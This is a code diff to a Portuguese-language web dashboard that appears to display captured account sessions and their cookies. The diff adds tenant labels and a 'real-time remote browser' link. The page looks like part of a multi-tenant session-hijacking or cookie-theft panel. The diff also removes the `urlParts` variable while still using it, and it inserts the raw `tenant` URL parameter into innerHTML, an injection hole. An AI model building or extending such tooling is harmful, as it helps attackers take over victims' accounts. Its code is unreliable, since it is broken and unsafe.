@@ -444,12 +444,19 @@
       </div>
     </div>
 
-    <div style="display: flex; align-items: center; gap: 12px;">
+    <div style="display: flex; align-items: center; gap: 10px; flex-wrap: wrap;">
+      <div class="live-badge" id="session-tenant-badge" style="background: rgba(99, 102, 241, 0.15); border-color: rgba(99, 102, 241, 0.35); color: #818cf8;">
+        <span>Tenant: default</span>
+      </div>
       <div class="live-badge">
         <div class="pulse-dot"></div>
         <span>Sessão Autenticada</span>
       </div>
-      <a href="/painel" class="btn btn-secondary">
+      <a id="btn-abrir-remota" href="/sessaoremota.html" class="btn btn-secondary" style="border-color: rgba(99, 102, 241, 0.4); color: #818cf8;" title="Abrir Navegador Remoto em Tempo Real">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="20" height="14" x="2" y="3" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+        <span>Navegador Remoto</span>
+      </a>
+      <a id="link-voltar-painel" href="/painel" class="btn btn-secondary" title="Voltar ao Painel Geral">
         <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="15 18 9 12 15 6"/></svg>
         <span>Voltar ao Painel</span>
       </a>
@@ -608,13 +615,13 @@
       return dec.trim();
     }
 
-    const urlParts = window.location.pathname.split("/").filter(Boolean);
+    const urlParams = new URLSearchParams(window.location.search);
     let rawUsuario = urlParts[urlParts.length - 1] || "";
     if (rawUsuario === "sessao" || rawUsuario === "acesso" || rawUsuario === "sessaoremota") {
-      const sp = new URLSearchParams(window.location.search);
-      rawUsuario = sp.get("usuario") || "";
+      rawUsuario = urlParams.get("usuario") || "";
     }
     const usuarioParam = sanitizarUsuario(rawUsuario);
+    const tenantParam = urlParams.get("tenant") || urlParams.get("cliente") || "";
 
     let sessaoData = null;
 
@@ -632,8 +639,21 @@
     const urlDestinoBadge = document.getElementById("url-destino-badge");
     const tbodyCookies = document.getElementById("tbody-cookies");
     const totalLinhasCookies = document.getElementById("total-linhas-cookies");
+    const sessionTenantBadge = document.getElementById("session-tenant-badge");
+    const linkVoltarPainel = document.getElementById("link-voltar-painel");
+    const btnAbrirRemota = document.getElementById("btn-abrir-remota");
     const toast = document.getElementById("toast");
     const toastMsg = document.getElementById("toast-msg");
+
+    if (sessionTenantBadge) {
+      sessionTenantBadge.innerHTML = `<span>Tenant: ${tenantParam || 'default'}</span>`;
+    }
+    if (linkVoltarPainel) {
+      linkVoltarPainel.href = `/painel${tenantParam ? `?tenant=${encodeURIComponent(tenantParam)}` : ''}`;
+    }
+    if (btnAbrirRemota) {
+      btnAbrirRemota.href = `/sessaoremota.html?usuario=${encodeURIComponent(usuarioParam || '')}${tenantParam ? `&tenant=${encodeURIComponent(tenantParam)}` : ''}`;
+    }
 
     function showToast(msg) {
       if (!toast || !toastMsg) return;
@@ -659,16 +679,24 @@
 
     async function carregarSessao() {
       try {
+        const queryTenant = tenantParam ? `&tenant=${encodeURIComponent(tenantParam)}` : '';
         const apiUrl = usuarioParam
-          ? `/api/sessao/${encodeURIComponent(usuarioParam)}?t=${Date.now()}`
-          : `/api/sessao?t=${Date.now()}`;
+          ? `/api/sessao/${encodeURIComponent(usuarioParam)}?t=${Date.now()}${queryTenant}`
+          : `/api/sessao?t=${Date.now()}${queryTenant}`;
         const res = await fetch(apiUrl);
         if (!res.ok) throw new Error("Sessão não localizada");
         const data = await res.json();
         sessaoData = data;
 
         const u = data.usuario || usuarioParam || "Operador";
-        subUsuario.textContent = `Sessão capturada para o operador da conta: ${u}`;
+        const t = data.tenant || tenantParam || "default";
+        if (sessionTenantBadge) {
+          sessionTenantBadge.innerHTML = `<span>Tenant: ${t}</span>`;
+        }
+        if (btnAbrirRemota) {
+          btnAbrirRemota.href = `/sessaoremota.html?usuario=${encodeURIComponent(u)}${t ? `&tenant=${encodeURIComponent(t)}` : ''}`;
+        }
+        subUsuario.textContent = `Sessão capturada para o operador da conta: ${u} [Tenant: ${t}]`;
         kpiUsuario.textContent = u;
         kpiData.textContent = data.data_hora || "—";
         kpiCookies.textContent = data.total_cookies || (data.cookies ? data.cookies.length : 0);
